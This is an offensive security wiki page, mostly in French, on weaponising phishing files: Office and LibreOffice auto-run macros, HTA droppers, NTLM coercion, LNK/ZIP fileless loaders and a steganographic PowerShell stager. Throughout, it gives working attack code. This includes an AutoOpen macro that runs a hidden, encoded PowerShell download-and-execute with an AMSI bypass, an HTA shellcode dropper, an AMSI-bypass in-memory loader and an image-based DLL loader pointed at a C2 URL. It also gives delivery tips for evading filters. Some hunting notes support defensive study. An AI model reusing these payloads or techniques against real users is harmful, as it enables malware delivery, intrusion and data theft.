# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word effectue une validation des données du fichier avant d’ouvrir un fichier. La validation des données est effectuée sous la forme d’une identification de structure de données, conformément au standard OfficeOpenXML. Si une erreur se produit pendant l’identification de la structure de données, le fichier analysé ne sera pas ouvert.

En général, les fichiers Word contenant des macros utilisent l’extension `.docm`. Cependant, il est possible de renommer le fichier en changeant son extension tout en conservant la capacité d’exécuter des macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera pris en charge par Microsoft Word et pourra exécuter des macros.\
Les mêmes éléments internes et mécanismes s’appliquent à tout le logiciel de la suite Microsoft Office (Excel, PowerPoint etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont être exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX faisant référence à un modèle distant (File –Options –Add-ins –Manage: Templates –Go) qui inclut des macros peuvent aussi « exécuter » des macros.

### External Image Load

Allez à : _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, et **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Autoload functions

Plus elles sont courantes, plus l’AV a de chances de les détecter.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Suppression manuelle des métadonnées

Allez dans **File > Info > Inspect Document > Inspect Document**, ce qui ouvrira le Document Inspector. Cliquez sur **Inspect**, puis sur **Remove All** à côté de **Document Properties and Personal Information**.

#### Extension du document

Une fois terminé, sélectionnez le menu déroulant **Save as type**, puis changez le format de **`.docx`** vers **Word 97-2003 `.doc`**.\
Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il existe une **stigma** **autour** de l'extension **`.docm`** avec macros activées (par ex. l'icône de miniature a un énorme `!` et certaines passerelles web/email les bloquent entièrement). Par conséquent, cette **extension héritée `.doc` est le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement à l'ouverture du fichier en liant la macro à l'événement **Open Document** (Tools → Customize → Events → Open Document → Macro…). Une simple macro reverse shell ressemble à ceci :
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Notez les guillemets doublés (`""`) à l'intérieur de la chaîne – LibreOffice Basic les utilise pour échapper les guillemets littéraux, donc les payloads qui se terminent par `...==""")` gardent à la fois la commande interne et l'argument `Shell` équilibrés.

Conseils de livraison :

- Enregistrez en `.odt` et liez la macro à l'événement du document afin qu'elle se déclenche immédiatement à l'ouverture.
- Lors de l'envoi par email avec `swaks`, utilisez `--attach @resume.odt` (le `@` est requis pour que les octets du fichier, et non la chaîne du nom de fichier, soient envoyés en pièce jointe). C'est essentiel lors de l'abus de serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.

## HTA Files

Un HTA est un programme Windows qui **combine HTML et des langages de scripting (tels que VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute comme une application "fully trusted", sans les contraintes du modèle de sécurité d'un navigateur.

Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d'IE**. Donc, s'il a été désinstallé, les HTA ne pourront pas s'exécuter.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcer l’authentification NTLM

Il existe plusieurs façons de **forcer l’authentification NTLM "à distance"**, par exemple, vous pourriez ajouter des **images invisibles** à des emails ou HTML que l’utilisateur va consulter (même un HTTP MitM ?). Ou envoyer à la victime **l’adresse de fichiers** qui **déclencheront** une **authentification** simplement en **ouvrant le dossier**.

**Consultez ces idées et d’autres dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N’oubliez pas que vous pouvez non seulement voler le hash ou l’authentification, mais aussi **mener des attaques NTLM relay** :

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Des campagnes très efficaces livrent un ZIP qui contient deux documents leurres légitimes (PDF/DOCX) et un .lnk malveillant. L’astuce est que le vrai loader PowerShell est stocké à l’intérieur des octets bruts du ZIP après un marqueur unique, et le .lnk l’extrait et l’exécute entièrement en mémoire.

Flux typique implémenté par le one-liner PowerShell du .lnk :

1) Localiser le ZIP d’origine dans des chemins courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData%, et le parent du répertoire de travail actuel.
2) Lire les octets du ZIP et trouver un marqueur codé en dur (par ex. xFIQCV). Tout ce qui suit le marqueur est le payload PowerShell embarqué.
3) Copier le ZIP vers %ProgramData%, l’extraire là-bas, et ouvrir le .docx leurre pour paraître légitime.
4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Déobfusquer l’étape suivante (par ex. supprimer tous les caractères #) et l’exécuter en mémoire.

Exemple de squelette PowerShell pour extraire et exécuter l’étape embarquée :
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- La livraison abuse souvent des sous-domaines PaaS réputés (par ex. *.herokuapp.com) et peut filtrer les payloads (servir des ZIP bénins selon l’IP/l’UA).
- La next stage déchiffre fréquemment du shellcode base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc pour minimiser les artefacts sur disque.

Persistence used in the same chain
- COM TypeLib hijacking du contrôle Microsoft Web Browser afin que IE/Explorer ou toute app l’intégrant relance automatiquement le payload. Voir les détails et des commandes prêtes à l’emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Fichiers ZIP contenant la chaîne ASCII marqueur (par ex. xFIQCV) ajoutée aux données de l’archive.
- .lnk qui énumère les dossiers parent/user pour localiser le ZIP et ouvre un document leurre.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Un autre schéma récurrent est un **`.lnk` usurpant un document** qui ouvre immédiatement un leurre bénin tout en préparant la vraie chaîne en arrière-plan.

Workflow observé :
1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe` ou un proxy similaire pour lancer un downloader PowerShell obfusqué.
2. Le PowerShell fragmente les tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves cherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ratent la commande.
3. Le stager télécharge d’abord le **document leurre**, l’ouvre pour la victime, puis reconstruit les fichiers malveillants en arrière-plan.
4. Les payloads peuvent être écrits avec des **junk extensions** puis renommés en supprimant les caractères de remplissage, retardant l’apparition d’artefacts évidents `.exe` / `.cpl`.
5. La persistence est établie avec une **scheduled task basée sur les minutes** qui lance un binary hôte de confiance depuis un chemin inscriptible par l’utilisateur.

Minimal hunting clues from this pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Une disposition de staging utile à reconnaître est :
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Why the second stage is stealthy

Dans l’étude de cas Rapid7, la tâche planifiée lançait à répétition **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était staged à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance side-loadait le CPL de l’attaquant au lieu de la copie légitime du système.

Le CPL :
- Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
- Le déchiffre via **Windows CNG / `bcrypt.dll`**
- Alloue de la mémoire exécutable et copie le shellcode déchiffré
- L’exécute indirectement en passant le pointeur du shellcode comme callback pour **`EnumUILanguagesW`**

Cette dernière étape mérite une chasse séparée : les malwares évitent souvent un saut direct `((void(*)())buf)()` et abusent à la place d’un **WinAPI légitime prenant un callback** pour transférer l’exécution.

Le payload déchiffré dans cette campagne était du shellcode **Donut**, qui a ensuite mappé le PE final entièrement en mémoire et patché **AMSI/WLDP/ETW** dans le processus courant avant de transférer l’exécution. Pour des notes plus approfondies sur le side-loading et le post-traitement en mémoire, voir :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivots de chasse pratiques :
- `.lnk` lançant `powershell.exe` ou `conhost.exe`, suivi d’un document leurre visible.
- Téléchargements de courte durée vers **`C:\Users\Public\`** suivis immédiatement de renommages depuis des extensions absurdes.
- Tâches planifiées avec des noms banals comme `GoogleErrorReport` exécutées depuis des **répertoires inscriptibles par l’utilisateur**.
- Binaires de confiance chargeant des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
- Blobs texte Base64 écrits sous **`C:\Windows\Tasks\`** puis lus par le module side-loadé.

## Charges utiles délimitées par stéganographie dans des images (PowerShell stager)

Des chaînes de loader récentes livrent un JavaScript/VBS obfusqué qui décode et exécute un stager PowerShell en Base64. Ce stager télécharge une image (souvent GIF) qui contient une DLL .NET encodée en Base64, cachée comme texte brut entre des marqueurs de début/fin uniques. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte entre les deux, le Base64-décode en octets, charge l’assembly en mémoire et appelle une méthode d’entrée connue avec l’URL C2.

Workflow
- Stage 1: Dropper JS/VBS archivé → décode le Base64 embarqué → lance le stager PowerShell avec -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par ex., VAI) en passant l’URL C2 et les options.
- Stage 3: Le loader récupère le payload final et l’injecte généralement via process hollowing dans un binaire de confiance (couramment MSBuild.exe). Voir plus d’informations sur process hollowing et l’exécution via un utilitaire de confiance ici :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL d’une image et invoquer une méthode .NET en mémoire :

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- This is ATT&CK T1027.003 (steganography/marker-hiding). Les marqueurs varient selon les campagnes.
- AMSI/ETW bypass et la déobfuscation des chaînes sont souvent appliqués avant le chargement de l'assembly.
- Hunting: analysez les images téléchargées à la recherche de délimiteurs connus ; identifiez PowerShell accédant à des images puis décodant immédiatement des blobs Base64.

Voir aussi les outils stego et les techniques de carving :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Une première étape récurrente est un petit `.js` ou `.vbs` fortement obfusqué, livré dans une archive. Son seul but est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` pour amorcer l'étape suivante via HTTPS.

Logique schématique (abstraite) :
- Lire le contenu de son propre fichier
- Localiser un blob Base64 entre des chaînes inutiles
- Décoder en PowerShell ASCII
- Exécuter avec `wscript.exe`/`cscript.exe` invoquant `powershell.exe`

Indices de hunting
- Pièces jointes archivées JS/VBS lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` lançant `powershell.exe -nop -w hidden` depuis des chemins temporaires utilisateur.

## Windows files to steal NTLM hashes

Consultez la page sur les **places to steal NTLM creds** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
